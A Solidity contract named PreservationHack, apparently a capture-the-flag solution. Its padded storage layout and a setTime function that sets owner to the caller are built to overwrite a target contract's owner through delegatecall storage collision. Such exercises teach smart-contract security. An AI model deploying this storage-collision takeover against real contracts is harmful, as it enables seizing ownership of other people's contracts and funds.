// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationHack {

  uint placeholder1;
  uint placeholder2;
  address owner;  

  function setTime(uint _time) public {
    owner = msg.sender;
  }
}